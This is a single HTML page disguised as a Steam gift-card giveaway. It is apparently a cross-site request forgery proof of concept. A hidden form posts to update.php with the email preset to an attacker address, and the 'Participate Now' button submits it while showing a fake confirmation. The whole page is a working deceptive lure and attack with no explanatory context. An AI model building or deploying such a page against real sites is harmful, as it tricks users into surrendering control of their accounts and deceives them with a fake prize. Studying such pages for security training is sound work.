<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win 100€ Steam Gift Card</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
            text-align: center;
            width: 350px;
        }
        .container img {
            width: 80%;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .container h1 {
            font-size: 22px;
            color: #333;
            margin-bottom: 15px;
        }
        .container p {
            font-size: 16px;
            color: #555;
            margin-bottom: 20px;
        }
        .container button {
            background-color: #1b74e4;
            color: white;
            font-size: 16px;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        .container button:hover {
            background-color: #155ab4;
        }
        .container footer {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="steam.jpg" alt="Steam Gift Card">
        <h1>Win 100€ Steam Gift Card!</h1>
        <p>Participate now and stand a chance to win a 100€ Steam Gift Card. Offer valid for a limited time only!</p>
        <form method="POST" action="update.php" style="display:none;">
            <input type="email" name="email" value="youarehacked@gmail.com">
            <button type="submit">Send</button>
        </form>
        <button onclick="document.forms[0].submit(); alert('Congratulations! Your participation is confirmed.');">
            Participate Now
        </button>
        <footer>© 2024 Steam Giveaway</footer>
    </div>
</body>
</html>
